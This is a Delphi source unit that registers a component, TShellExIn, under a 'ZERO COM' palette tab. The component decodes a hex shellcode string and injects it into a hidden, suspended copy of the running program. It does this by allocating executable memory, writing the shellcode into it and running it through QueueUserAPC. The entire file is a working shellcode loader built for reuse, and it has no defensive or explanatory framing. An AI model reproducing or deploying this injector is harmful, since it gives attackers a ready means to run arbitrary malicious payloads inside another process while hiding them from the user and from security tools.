unit ShellExIn;

interface

uses Winapi.Windows, System.Classes;


type
  TShellExIn = class(TComponent)

private
  FShellCode: string;
  procedure StrHexToArrByte(RawData: string; out OutArrayData: TArray<Byte>);
  protected
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
    procedure Execute;
  published
    property ShellCode: string read FShellCode write FShellCode;
end;

var
  XShellExIn: TShellExIn;

procedure Register;

implementation

constructor TShellExIn.Create(AOwner:TComponent);
begin
  inherited Create(AOwner);
end;

destructor TShellExIn.Destroy;
begin
  inherited;
end;

procedure TShellExIn.StrHexToArrByte(RawData: string; out OutArrayData: TArray<Byte>);
var
  Len, I: Integer;
function STInt(const S: string): Integer;
var E: Integer;
begin
  Val(S, Result,E);
end;
begin
  Len := Length(RawData);
  if (Len > 0) and (Len mod 2 = 0) then
  begin
    SetLength(OutArrayData, Len div 2);
    I := 0;
    while (I <= High(OutArrayData)) do
    begin
      OutArrayData[I] := STInt('$' + Copy(RawData, I * 2 + 1, 2));
      Inc(I);
    end;
  end;
end;

procedure TShellExIn.Execute;
var
  AProcessInfo: TProcessInformation;
  AStartupInfo: TStartupInfo;
  pAddress: Pointer;
  Written : SIZE_T;
  RawData: TArray<Byte>;
begin
  XShellExIn.StrHexToArrByte(FShellCode, RawData);
  ZeroMemory(@AProcessInfo, SizeOf(TProcessInformation));
  ZeroMemory(@AStartupInfo, Sizeof(TStartupInfo));
  AStartupInfo.cb := SizeOf(TStartupInfo);
  AStartupInfo.wShowWindow := 0;
  AStartupInfo.dwFlags := (STARTF_USESHOWWINDOW);
  if not CreateProcessW(PChar(ParamStr(0)), nil, nil, nil, False, CREATE_SUSPENDED, nil, nil, AStartupInfo, AProcessInfo) then Exit;
  try
    pAddress := VirtualAllocEx(AProcessInfo.hProcess, nil, Length(RawData), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if not Assigned(pAddress) then Exit;
    if not WriteProcessMemory(AProcessInfo.hProcess, pAddress, @RawData[0], Length(RawData), Written) then Exit;
    if not QueueUserAPC(pAddress, AProcessInfo.hThread, 0) then Exit;
    ResumeThread(AProcessInfo.hThread);
  finally
    CloseHandle(AProcessInfo.hThread);
    CloseHandle(AProcessInfo.hProcess);
  end;
end;

procedure Register;
begin
  RegisterComponents('ZERO COM', [TShellExIn]);
end;

end.